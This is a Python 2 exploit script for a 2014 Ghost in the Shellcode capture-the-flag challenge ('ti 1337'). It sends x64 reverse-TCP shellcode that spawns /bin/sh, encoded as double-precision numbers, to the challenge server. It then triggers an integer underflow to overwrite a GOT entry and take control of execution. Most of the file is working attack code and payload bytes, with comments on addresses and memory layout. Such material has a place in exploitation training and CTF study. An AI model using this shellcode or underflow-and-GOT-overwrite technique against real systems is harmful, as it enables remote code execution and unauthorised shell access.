#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# Ghost in the shellcode 2014 - ti 1337 (pwn 100)
# --------------------------------------------------------------------------------------------------
from ctypes import c_longlong as ll
import hashlib
import binascii
import struct
import array
import socket


shellcode = (
    # a reverse tcp x64 linux shellcode, which connected at 127.0.0.1:9999
    "\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc0\x48\x83\xc0\x71\x48\x31\xff\x48\x31"
    "\xf6\x0f\x05\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x83\xc0\x29\x48\x83\xc7\x02\x48"
    "\x83\xc6\x01\x0f\x05\xeb\x10\x01\x01\x01\x01\x01\x01\x01\x01\x03\x01\x28\x10\x80"
    "\x01\x01\x02\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x01\xc7\x48\x31\xc0\x50\x48"
    "\x03\x05\xe1\xff\xff\xff\x48\x2b\x05\xd2\xff\xff\xff\x50\x48\x01\xe6\x48\x83\xc2"
    "\x10\x48\x31\xc0\x48\x83\xc0\x2a\x0f\x05\x48\x31\xf6\x48\x39\xc6\x74\x0c\x48\x31"
    "\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x0f\x05\x48"
    "\x83\xfe\x02\x48\xff\xc6\x76\xee\x48\x31\xc0\x48\x83\xc0\x3b\x48\xbf\x2f\x62\x69"
    "\x6e\x2f\x73\x68\xff\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x31\xff\x48\x01\xe7"
    "\x48\x31\xf6\x48\x31\xd2\x0f\x05\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
)

# --------------------------------------------------------------------------------------------------
if __name__=="__main__":

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(('ti-1337.2014.ghostintheshellcode.com', 31415))
    # s.connect(('127.0.0.1', 31415))       # connect to server


    # buffer is located at 603150 and buffer size at 603140. Slots are 8 bytes long. There's 
    # an integer underflow, so 2 b's will point 2 slots above buffer -> 603140 after 2 b's we
    # need a double to overwrite the stack size with exactly we want. The target address will
    # be the ret address of the function 40149F. Start by injecting the shellcode in buffer:
    print "Injectings Shellcode in double format:"
    
    # first is the shellcode. Because connection is done through netcat, we need a reverse
    # TCP shellcode. We get 8 bytes from shellcode and convert them to double format:
    #
    #   alternative way to convert string to double:
    #       doubles_sequence = array.array('d', shellcode[0:8])
    #       print "%.32g" % doubles_sequence[0]
    #
    for i in range(0,len(shellcode)-8, 8):  
        # .127le --> precision its very important!
        buf  = "%.127le" % struct.unpack('d', shellcode[i: i+8])[0]
        s.send(buf + "\n")              # send shellcode
        print buf                       # print double

    # now clear stack, and underflow to overwrite stack_size
    s.send("c\nb\nb\n")                 # send the 2 b's to the server


    # now overwrite an entry in GOT. GOT is located at 0x603020 so we need
    # (0x603140-0x603020)/8 = 36 more b's:
    for i in range (0,36):              # send 36 more bs'
        s.send( "b\n" );    


    # the next number will write at the target address. The target address should point to
    # beginning of our buffer, at 603150.
    jmp_addr = ll(0x603154)             # convert to long long
    buf  = "%.127le" % struct.unpack('d', jmp_addr)[0]
    s.send(buf + "\n")                  # send to server
    print buf                           # print in double format
    

    # at this point, RIP controlled
    raw_input( 'Reverse shell opened. Press any key to continue...' )           

    s.close()                           # close connection with the server      


# --------------------------------------------------------------------------------------------------
